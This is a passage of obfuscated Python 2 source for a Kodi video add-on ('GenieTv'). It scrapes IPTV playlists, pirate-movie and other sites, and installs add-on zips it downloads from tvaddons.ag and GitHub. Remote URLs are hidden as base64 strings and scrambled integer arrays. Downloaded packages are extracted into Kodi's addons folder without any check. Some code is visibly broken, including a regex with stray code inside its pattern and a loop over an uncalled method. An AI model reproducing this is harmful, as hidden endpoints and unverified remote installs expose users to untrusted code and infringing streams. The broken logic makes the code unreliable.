  oOO0OO0OO ( Search_Name + ': Link 3' , ( IIo0Oo0oO0oOO00 ) . replace ( '\\' , '' ) , 222 , o00OO0o0 )
  if 55 - 55: Oo
def IIi1i1I11IIII ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 o0o = re . compile ( '#EXTINF:-1,(.+)\s*(.+)\s*' ) . findall ( iIIiiI1II1i11 )
 for OO , iI1i11 in o0o :
  oOO0OO0OO ( OO , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) + '|connection=keep-alive' , 222 , ii11iIi1I + 'english.png' )
def OooOoOOO00O ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 o0o = re . compile ( '#EXTINF:-2,(.+)\s*(.+)\s*' ) . findall ( iIIiiI1II1i11 )
 for OO , iI1i11 in o0o :
  oOO0OO0OO ( OO , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'xxx.png' )
def I111iIIII11iI ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( oo ( 0 , [ 97 , 129 , 72 , 149 , 82 , 100 , 48 , 63 , 99 , 170 , 68 , 159 , 111 , 42 , 118 , 83 , 76 , 128 , 51 , 61 , 100 , 44 , 51 , 201 , 100 , 148 , 121 , 134 , 53 ] , [ 159 , 114 , 70 , 98 , 144 , 50 , 37 , 82 , 253 , 112 , 184 , 99 , 50 , 71 , 154 , 120 , 110 , 108 , 179 , 101 , 250 , 72 , 65 , 82 , 125 , 50 , 52 , 76 , 28 , 109 , 124 , 78 , 191 , 118 , 193 , 76 , 193 , 110 , 145 , 86 , 92 , 114 , 193 , 76 , 41 , 50 , 82 , 82 , 206 , 118 , 32 , 100 , 163 , 50 , 209 , 53 , 191 , 115 , 42 , 98 , 30 , 50 , 237 , 70 , 26 , 107 , 70 , 99 , 64 , 121 , 115 , 57 , 230 , 116 , 32 , 97 , 39 , 88 , 58 , 104 , 38 , 50 , 77 , 98 , 185 , 50 , 86 , 81 , 80 , 117 , 111 , 98 , 226 , 84 , 75 , 78 , 210 , 49 ] ) ) )
 o0o = re . compile ( '#EXTINF:.+?,(.+)\s*(.+)\s*' ) . findall ( iIIiiI1II1i11 )
 for OO , iI1i11 in o0o :
  oOO0OO0OO ( OO , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'vod(1).png' )
  if 59 - 59: OoOoOO00
def iIiIi11I1iIii1i11 ( url ) :
 url
 iIiiI11II11i = xbmcgui . ListItem ( OO , path = url )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , iIiiI11II11i )
 return
 if 98 - 98: oo0OO - oo0OO
 if 58 - 58: OoIii111II
def oOOo0OO00OoO ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<a class=.+?href="(.+?)">.+?<div class="videothumboverlay hidden-xs" id=".+?">(.+?)</div>.+?<div class="videothumbbox"><img src="(.+?)" class="videothumb" alt="(.+?)"></div>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( "<a href='(.+?)' class='paginationnext'>Next &raquo;</a></div>" ) . findall ( iIIiiI1II1i11 )
 for url , o0OO0o0o00o , o0O0o0 , OO in o0o :
  ooOooo000oOO ( OO , 'https://www.fitnessblender.com' + url , 7086 , 'https://www.fitnessblender.com' + o0O0o0 , '' , ( o0OO0o0o00o ) . replace ( '</p>' , ' ' ) . replace ( '<p>' , ' ' ) )
  Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 for url in oo000 :
  ooOO00oOOo000 ( 'NEXT' , 'https://www.fitnessblender.com' + url , 7085 , ii11iIi1I + 'Next.png' )
  if 95 - 95: Ooo00oOo00o . OoIii111II
def o0oO0oOOOo ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<div class=\'videowrapper\'><iframe width="700" height="394" src="//www.youtube.com/embed/(.+?)?rel=0&wmode=transparent" frameborder="0"></iframe></div>.+?<div class="col-xs-6 col-md-2 rightborder">(.+?)</div>.+?<p class="videodetailvalue"><img src=\'(.+?)\'/></p>' , re . DOTALL ) . findall ( OoOO )
 for url , o0OO0o0o00o , o0O0o0 in o0o :
  Ii1iIiII1ii1 ( 'PLAY' , url , 8043 , 'https://www.fitnessblender.com' + o0O0o0 , '' , o0OO0o0o00o )
  Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 O00OO0o0 = re . compile ( '<h2 class="videodetailheader">Workout Details</h2>(.+?)</div>' , re . DOTALL ) . findall ( OoOO )
 for oo000Oo0 in O00OO0o0 :
  OoOOoo0o = ( oo000Oo0 ) . replace ( '<p>' , '' ) . replace ( '</p>' , '' ) . replace ( '<br />' , '' ) . replace ( '&nbsp;' , '' ) . replace ( '<strong>' , '' ) . replace ( '</strong>' , '' ) . replace ( '"' , '' ) . replace ( '<' , '' ) . replace ( '>' , '' ) . replace ( 'a href' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&rsquo;t' , '' ) . replace ( '&' , '&' )
  ooOooo000oOO ( 'INFO' , '' , 7087 , 'https://www.fitnessblender.com' + o0O0o0 , '' , OoOOoo0o )
  if 50 - 50: Oo * i11iIiiIii + O0
def oOo00oooOO ( INFO ) :
 iIIi1i1 ( 'info for workout' , INFO )
 if 4 - 4: I1IiI * OOooOOo - Ooo0OO0oOO . OoooooooOO * i11iIiiIii . OOooOOo
 if 16 - 16: i1IIi . i1IIi / O0o0Ooo % I1IiI / OOOo0 * ii11ii1ii
 if 30 - 30: OOooOOo + OoooooooOO + iii11 / OoOoOO00 * Oo
def O00O0 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'cat-item-.+?"><a href="(.+?)" >(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  ooOO00oOOo000 ( OO , url , 9031 , ii11iIi1I + 'icon.png' )
def IIIIIIIiiiI ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<a href="(.+?)" title=".+?" rel="bookmark"><time class="entry-date published updated" datetime=".+?">(.+?)</time></a>' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  ooOO00oOOo000 ( OO , url , 9032 , ii11iIi1I + 'icon.png' )
def oO0Oooo0OoO ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '#EXTINF:-.+?,(.+)\s*(.+)\s*' ) . findall ( iIIiiI1II1i11 )
 for OO , url in o0o :
  if '://' in OO :
   pass
   oOO0OO0OO ( ( OO ) . replace ( '<br />' , '' ) , ( url ) . replace ( '<br />' , '' ) , 222 , ii11iIi1I + 'icon.png' )
def Iiii1IIIIiiI11 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'EXTINF:-.+?,(.+)</div></li><li class=".+?"><div class=".+?">(.+?)</div>).findall' ) . findall ( iIIiiI1II1i11 )
 for OO , url in o0o :
  oOO0OO0OO ( OO , url , 222 , ii11iIi1I + 'icon.png' )
  if 8 - 8: ii11i1 + OOOo0 / oo0OO / o0Oo0O0Oo00oO + iIii1I11I1II1 + OoooooooOO
  if 33 - 33: OoOoOO00 - OoO0O0 - o0Oo0O0Oo00oO
  if 92 - 92: Ooo00oOo00o * OoO0O0
def ooo00o0OO ( ) :
 iIIiiI1II1i11 = ooOOO0 ( 'http://www.disclose.tv/action/videolist/aliens/page/1/all/channel/1/category/1/' )
 o0o = re . compile ( '<li><a href="([^"]*)">(.+?)</a></li>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , 'http://www.disclose.tv/' + iI1i11 , 7010 , ii11iIi1I + 'disclose.png' )
  if 32 - 32: iii11 + oo0OO + iIii1I11I1II1 * Oo
  if 62 - 62: i11iIiiIii
def i1Iii ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'href="([^"]*)"><img width="135" height="76" alt="([^"]*)".+?src="([^"]*)" />' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( iIIiiI1II1i11 )
 for url , OO , o0O0o0 in o0o :
  ooOO00oOOo000 ( OO , 'http://www.disclose.tv/' + url , 7011 , o0O0o0 )
 for url in next :
  ooOO00oOOo000 ( 'NEXT' , url , 7010 , ii11iIi1I + 'Next.png' )
  if 91 - 91: o0Oo0O0Oo00oO * OoO0O0 * OoOoOO00
  if 79 - 79: O0o0Ooo
def i1iiiIi11 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( 'url: "([^"]*)",' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( "src='([^']*)' type='([^']*)' />" , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  if 'http' in url :
   oOO0OO0OO ( 'video/flv' , url , 222 , ii11iIi1I + 'disclose.png' )
 for url , OO in oo000 :
  oOO0OO0OO ( OO , url , 222 , ii11iIi1I + 'disclose.png' )
  if 89 - 89: Ooo00oOo00o + OOooOOo . iii11 - OOOo0 * i1IIi % OoOoOO00
  if 30 - 30: ii11ii1ii
def Ooo0ooo0oo ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<div id="play-1".+?src="(.+?)" scrolling="no".+?<li><a href="#play-1">(.+?)</a></li>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  ooOO00oOOo000 ( OO , ( url + '&fv=&sou=' ) . replace ( 'player' , 'watch' ) , 7000 , ii11iIi1I + 'icon.png' )
  if 21 - 21: OoO0O0 - OOOo0 % OoooooooOO + OOooOOo
def o00O0o ( name , url , img ) :
 OoOO = ooOOO0 ( url )
 i1Ii1 = re . compile ( '<iframe class="playerframe" src="(.+?)" scrolling=".+?" marginwidth=".+?" marginheight=".+?" vspace=".+?" hspace=".+?" allowfullscreen=".+?" webkitallowfullscreen=".+?" mozallowfullscreen=".+?" width=".+?" height=".+?" frameborder=".+?"></iframe>' , re . DOTALL ) . findall ( OoOO )
 oooOOo0oOoOO = len ( i1Ii1 )
 if 6 - 6: OoIii111II . Ooo0OO0oOO
 if 43 - 43: ii11ii1ii + OOooOOo
 if oooOOo0oOoOO == 1 :
  for iI1iiiiiii in i1Ii1 :
   iI1iiiiiii = iI1iiiiiii . replace ( 'player' , 'watch' )
   Oo00oo = iI1iiiiiii + '&fv=&sou='
   oO0oO = ooOOO0 ( Oo00oo )
   o0ooo = re . compile ( '<source src="(.+?)" type=".+?">' , re . DOTALL ) . findall ( oO0oO )
   for O0Oooo in o0ooo :
    IiIii11I = False
    Resolve ( O0Oooo )
    if 97 - 97: i1IIi + oo0OO . o0Oo0O0Oo00oO - oo0OO
 elif oooOOo0oOoOO > 1 :
  if 53 - 53: O0 . OOOo0
  for iI1iiiiiii in i1Ii1 :
   o0oOOoO000 = ooOOO0 ( iI1iiiiiii )
   Oo00o00Oo = re . compile ( '<iframe width=".*?" height=".*?" frameborder=".*?" src="(.*?)" scrolling=".*?" marginwidth=".*?" marginheight=".*?" vspace=".*?" hspace=".*?" allowfullscreen=".*?" webkitallowfullscreen=".*?" mozallowfullscreen=".*?"></iframe>' , re . DOTALL ) . findall ( o0oOOoO000 )
   i1I1i1I111 = Oo00o00Oo
   i1I1i1I111 = ( str ( i1I1i1I111 ) ) . replace ( '[\'' , '' ) . replace ( '\']' , '' ) ;
   print 'Stripped url : ' + i1I1i1I111
   oOO0OO0OO ( 'DOUBLE LINK' , i1I1i1I111 , 424 , '' )
   if 90 - 90: OOooOOo * iii11 / OoO0O0
   for url in Oo00o00Oo :
    ooOO00oOOo000 ( 'DOUBLE LINK' , url , 424 , '' )
    try :
     Ooo0OOoOoO0 = Google . resolve ( url )
    except :
     pass
    try :
     iiiIIIII11i1I = re . findall ( r"{'url': u'(.*?)', 'quality': 'HD'}, {'url': u'(.*?)', 'quality': 'SD'}" , str ( Ooo0OOoOoO0 ) )
     for o0O , o0ooooOOoo in iiiIIIII11i1I :
      if 36 - 36: iii11 * ii11i1
      HD_URLS . append ( o0O )
      SD_URLS . append ( o0ooooOOoo )
    except :
     pass
 else :
  pass
  if 16 - 16: OoOoOO00
def oooOO0OO0 ( ) :
 if 10 - 10: OOOo0 / ii11ii1ii
 if 68 - 68: iii11 - OoooooooOO
 ooOO00oOOo000 ( 'Genres' , 'http://cnfstudio.com/movies/' , 7002 , ii11iIi1I + 'Movies.png' )
 if 14 - 14: O0 / OoIii111II - Oo - OoO0O0
 ooOO00oOOo000 ( 'Search Movies' , '' , 7017 , ii11iIi1I + 'Movies.png' )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 44 - 44: Ooo00oOo00o
 if 32 - 32: I1IiI % Ooo00oOo00o + i11iIiiIii + o0Oo0O0Oo00oO - ii11i1 + OoIii111II
def iiIIi1II ( ) :
 iIIiiI1II1i11 = ooOOO0 ( 'http://cnfstudio.com/' )
 o0o = re . compile ( '<a href="http://cnfstudio.com/genre/(.+?)">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , 'http://cnfstudio.com/genre/' + iI1i11 , 7003 , ii11iIi1I + 'icon.png' )
  if 1 - 1: I1IiI * O0 . OoIii111II % O0 + OoOoOO00
i1iiIIiiI111 = xbmcgui . Dialog ( )
if 49 - 49: Ooo0OO0oOO . iii11
if 74 - 74: i1IIi
def Ii11ii1 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt=".+?" />.+?<a href="(.+?)"><span class="player"></span></a>.+?<h2>(.+?)</h2>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 iiiIiiiI1I = re . compile ( "<link rel='next' href='(.+?)'/>" ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 , url , OO in o0o :
  oOO0OO0OO ( ( OO ) . replace ( '&#038;' , '' ) . replace ( '&#8216;' , '' ) . replace ( '&#8217;' , '' ) . replace ( '&#8211;' , '' ) , url , 7004 , o0O0o0 )
 iiiIiiiI1I = iiiIiiiI1I
 for url in iiiIiiiI1I :
  ooOO00oOOo000 ( 'Next Page' , url , 7003 , ii11iIi1I + 'Next.png' )
  if 6 - 6: Ooo00oOo00o
def OO000OOOo0Oo ( url ) :
 if 75 - 75: OoOoOO00 + o0Oo0O0Oo00oO % iii11 + Oo
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<div id="play-1" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</div>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  oOooo0O0o = url + '&fv=&sou='
  oOooo0O0o = oOooo0O0o . replace ( 'player' , 'watch' )
  oOoOOoo = Oo00O0o0O ( oOooo0O0o )
  O0OoOO = Oo00O0o0O ( url )
  if 72 - 72: ii11i1 % ii11i1 / OOOo0
  if 40 - 40: Oo - iii11 + O0o0Ooo - OOooOOo % OOOo0 . o0Oo0O0Oo00oO
def Oo00O0o0O ( url ) :
 if 35 - 35: i11iIiiIii + OoooooooOO * iIii1I11I1II1 . O0o0Ooo
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<video id=".+?<source src="(.+?)" type="video/mp4">' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  oOo0OOoO0 ( url )
  if 48 - 48: oo0OO * i1IIi % OoooooooOO * ii11i1 * Ooo00oOo00o
  if 7 - 7: oo0OO . ii11i1 . oo0OO - O0o0Ooo
def I1IiiI ( ) :
 ooOooo000oOO ( '[COLORgreen]Local M3u[/COLOR]' , oOo0oooo00o , 2001 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Remote M3u[/COLOR]' , Oo0o0000o0o0 , 1009 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 29 - 29: oo0OO . oo0OO
def I1i11IIIi ( url ) :
 o0o = re . compile ( '^#EXTINF:-?[0-9]*(.*?),(.*?)\n(.*?)$' , re . I + re . M + re . U + re . S ) . findall
 for III1IIIIIiiI , OO , url in o0o :
  oOO0OO0OO ( OO , url , 222 , ii11iIi1I + 'streams.png' )
  if 38 - 38: O0
  if 79 - 79: i1IIi . OoIii111II
def i1i1i11iI11II ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvdHJlZS9tYXN0ZXIvX3JlcG8vcGx1Z2luLnZpZGVvLkdlbmllVHY=' ) )
 o0o = re . compile ( '<span class="css-truncate css-truncate-target"><a href="/GenieTv/Genie_Tv/blob/master/_repo/plugin.video.GenieTv/(.+?)" class="js-navigation-open" id=".+?" title=".+?">.+?</a></span>' ) . findall ( OoOO )
 for iI1i11 in o0o :
  iI1i11 = i1111 ( 'aHR0cDovL3Jhdy5naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvbWFzdGVyL19yZXBvL3BsdWdpbi52aWRlby5HZW5pZVR2Lw==' ) + iI1i11
 OO = 'repository.GenieTv'
 if 6 - 6: I1IiI . OoOoOO00 * OOOo0 . OOOo0 / ii11i1
 I1I1ii1111 ( iI1i11 , OO )
 if 4 - 4: ii11ii1ii * O0 - O0o0Ooo - i11iIiiIii / OOooOOo . iii11
def i1ii11I111Ii ( ) :
 ooOooo000oOO ( '[COLORgreen]CATAGORIES[/COLOR]' , '' , 10051 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SEARCH[/COLOR]' , '' , 10052 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 77 - 77: Ooo00oOo00o + Ooo00oOo00o . o0Oo0O0Oo00oO * OoooooooOO + Ooo00oOo00o
 if 6 - 6: i1IIi - Ooo0OO0oOO
o0oO0 = xbmcaddon . Addon ( id = 'plugin.video.GenieTv' )
oOOoo00O0O = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
Oo0oO0ooo = xbmcgui . DialogProgress ( )
O0o00ooo = 'https://addons.tvaddons.ag/'
if 5 - 5: i1IIi - OoIii111II / I1IiI
def iII1I ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 ooo0O00000oo0 = 'https://addons.tvaddons.ag/search/?keyword=' + O0O0ooOOO
 OoOO = ooOOO0 ( ooo0O00000oo0 )
 o0o = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OoOO )
 for iI1i11 , iiI1IIIi , OO in o0o :
  ooOooo000oOO ( OO , iI1i11 , 10054 , 'https://addons.tvaddons.ag/' + iiI1IIIi , i1iiIII111ii , '' )
  if 92 - 92: O0o0Ooo % ii11i1
  if 30 - 30: OoOoOO00 - OOooOOo % O0o0Ooo . Ooo0OO0oOO
def oo0o ( ) :
 OoOO = ooOOO0 ( O0o00ooo )
 o0o = re . compile ( '<li><a href="(.+?)"><span class="thumbnail"><img src="(.+?)" class="pic" alt=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OoOO )
 for iI1i11 , o0O0o0 , OO in o0o :
  if 'Repositories' in OO :
   pass
  elif 'Services' in OO :
   pass
  elif 'International' in OO :
   pass
  else :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 10053 , 'https://addons.tvaddons.ag/' + o0O0o0 , i1iiIII111ii , '' )
   if 75 - 75: oo0OO + iIii1I11I1II1
   if 98 - 98: I1IiI - I1IiI . OoOoOO00 . oo0OO + O0
def Addon ( url ) :
 OoOO = ooOOO0 ( url )
 I1IiiiI = re . compile ( '<li class="nextPage"><a class=".+?" href="(.+?)"><dfn title="next Page">.+?</dfn></a></li>' ) . findall ( OoOO )
 for url in I1IiiiI :
  ooOooo000oOO ( '[COLORgreen]NEXT PAGE[/COLOR]' , 'https://addons.tvaddons.ag' + url , 10053 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 o0o = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OoOO )
 for url , o0O0o0 , OO in o0o :
  if 'Please' in OO :
   pass
  else :
   ooOooo000oOO ( OO , url , 10054 , 'https://addons.tvaddons.ag/' + o0O0o0 , i1iiIII111ii , '' )
   if 6 - 6: OOOo0 - i11iIiiIii
   if 61 - 61: O0o0Ooo * ii11ii1ii % OOOo0 % Ooo00oOo00o % Ooo0OO0oOO + Ooo0OO0oOO
def i1111I ( url , name ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<a href="(.+?)"' ) . findall ( OoOO )
 for url in o0o :
  if 'plugin' in url :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + url
   OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
   Oo0oO0ooo = xbmcgui . DialogProgress ( )
   Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
   oO0O = os . path . join ( OO0O00oOo , name + '.zip' )
   try :
    os . remove ( oO0O )
   except :
    pass
   downloader . download ( url , oO0O , Oo0oO0ooo )
   ii1II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
   time . sleep ( 2 )
   Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
   print '======================================='
   print ii1II
   print '======================================='
   extract . all ( oO0O , ii1II , Oo0oO0ooo )
   iI111i ( )
   if 58 - 58: OoooooooOO - Ooo0OO0oOO + iIii1I11I1II1 * i11iIiiIii
def I1I1ii1111 ( url , name ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
 oO0O = os . path . join ( OO0O00oOo , name + '.zip' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 ii1II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print ii1II
 print '======================================='
 extract . all ( oO0O , ii1II , Oo0oO0ooo )
 iI111i ( )
 if 80 - 80: i1IIi . OOOo0 - OoIii111II + iii11 + oo0OO % OoIii111II
def iI111i ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "Origin + Genie TV" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Origin + Jaybox[/COLOR]" )
 return
 if 13 - 13: OoOoOO00 / I1IiI / I1IiI + o0Oo0O0Oo00oO
 if 49 - 49: O0 / OoOoOO00 * OOOo0 - OoooooooOO . OoOoOO00 % OoO0O0
def IIi ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2NyYXBlZC9jYXRzLnBocA==' ) )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , iiI1IIIi , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 1007 , iiI1IIIi )
def i1Ii1i1ii1 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for url , iiI1IIIi , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 1006 , iiI1IIIi )
  if 86 - 86: OoIii111II % O0 + Ooo00oOo00o
  if 52 - 52: Oo / oo0OO
def Iii1IIII1Iii ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for url , IIii1111 , o0OO0o0o00o , I1iI , OO in o0o :
  if '.php' in url :
   oOoooO000O ( OO , url , 1016 , IIii1111 , I1iI , o0OO0o0o00o )
  else :
   if 'youtube' in url :
    i1iiIIiI1iiI ( OO , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii1111 , I1iI , o0OO0o0o00o )
   else :
    i1iiIIiI1iiI ( OO , url , 222 , IIii1111 , I1iI , o0OO0o0o00o )
    Oo0OoO00oOO0o ( 'movies' , 'INFO' )
    if 94 - 94: OoIii111II . OOooOOo % OOooOOo % OOOo0 - oo0OO / i11iIiiIii
 else :
  o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
  for url , iiI1IIIi , OO in o0o :
   if '.php' in url :
    ooOO00oOOo000 ( OO , url , 1016 , iiI1IIIi )
   else :
    if 'youtube' in url :
     print '>>>>>>>>>>>>>>>>>>>>>>> youtube old way'
     oOO0OO0OO ( OO , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , iiI1IIIi )
    else :
     oOO0OO0OO ( OO , url , 222 , iiI1IIIi )
     Oo0OoO00oOO0o ( 'movies' , 'INFO' )
     if 73 - 73: O0 * O0o0Ooo . i1IIi
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 51 - 51: Ooo00oOo00o - oo0OO % O0 - I1IiI
def o0oooo0oo00O ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3VybHMvdXJsLnBocA==' ) )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , iiI1IIIi , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 1007 , iiI1IIIi )
def IIIIII1iI1II ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for url , iiI1IIIi , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 1006 , iiI1IIIi )
  if 14 - 14: OOOo0 / O0
